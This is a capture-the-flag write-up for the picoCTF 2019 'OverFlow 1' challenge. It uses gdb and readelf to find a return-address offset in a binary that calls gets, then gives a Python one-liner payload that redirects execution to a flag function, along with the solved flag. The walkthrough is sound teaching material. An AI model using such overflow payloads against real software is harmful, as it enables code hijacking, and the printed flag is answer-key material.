# OverFlow 1
You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this [program](vuln)? You can find it in /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780 on the shell server. [Source](vuln.c).

## Hint
Take control that return address  
Make sure your address is in Little Endian.

## Solution
Like last time, we have to overflow the return address. However, we have to write a specific value into it. If we open up the program with gdb (the GNU project debugger), we can see the assembly layout and certain addresses in the program:
```bash
turtlesubmarine69@pico-2019-shell1:/problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780$ gdb vuln
(some messages while opening up)
(gdb) disas main
Dump of assembler code for function main:
```
```asm
   0x0804869e <+0>:     lea    0x4(%esp),%ecx
   0x080486a2 <+4>:     and    $0xfffffff0,%esp
   0x080486a5 <+7>:     pushl  -0x4(%ecx)
   .
   .
   .
   0x080486fd <+95>:    add    $0x10,%esp
   0x08048700 <+98>:    call   0x804865f <vuln>
   0x08048705 <+103>:   mov    $0x0,%eax
```
We see that the vuln function is called. The `call` command pushes, or "saves", the address of the next instruction (0x08048705) onto the stack, and it will jump to `vuln`'s address (0x804865f). A `ret` function in vuln will pop from this saved address from the stack later and jump to it, thus continuing the function. We want to overwrite this return address. Now when we disassemble `vuln`:
```bash
(gdb) disas vuln
Dump of assembler code for function vuln:
```
```asm
   0x0804865f <+0>:     push   %ebp
   0x08048660 <+1>:     mov    %esp,%ebp
   0x08048662 <+3>:     push   %ebx
   .
   .
   .
   0x08048677 <+24>:    push   %eax
   0x08048678 <+25>:    call   0x8048430 <gets@plt>
   0x0804867d <+30>:    add    $0x10,%esp
```
This program calls `gets` (last time it called `strcpy`). `gets` reads from stdin, and like `strcpy`, it doesn't check the size of the input, but it terminates when a newline character is reached(\x0a, the same as pressing "Enter" on a keyboard). We can input 64 bytes of a's (the size of the buffer) and see how close we are to the return address by analysing the stack with gdb:
```
(after inputting the a's)
(gdb) x/50x $esp
0xffb2ef20:     0xffb2ef30      0xf7f38000      0xffb2ef68      0x0804866b
0xffb2ef30:     0x61616161      0x61616161      0x61616161      0x61616161
0xffb2ef40:     0x61616161      0x61616161      0x61616161      0x61616161
0xffb2ef50:     0x61616161      0x61616161      0x61616161      0x61616161
0xffb2ef60:     0x61616161      0x61616161      0x61616161      0x61616161
0xffb2ef70:     0x08048800      0x0804a000      0xffb2ef98      0x08048705
.
.
.
```
There it is, the saved address 0x08048705 at 0xffb2ef7c. This means we need to overwrite 12 more bytes, and then add the return address in little endian, where we can use python's struct module to convert hexadecimal values into bytes, and overwrite it with the address of the flag function, which will read out the flag to us. We can find `flag`'s address with `readelf`, and `grep` the results for "flag":
```bash
turtlesubmarine69@pico-2019-shell1:/problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780$ readelf -s vuln | grep "flag"
    74: 080485e6   121 FUNC    GLOBAL DEFAULT   14 flag
```
Our payload looks like this:
```python -c "import struct; print 'a'*(64+12) + struct.pack('I', 0x080485e6)" | ./vuln```

## Details
Completed: *During competition*  
Done by: Cyril  
Flag: `picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}`
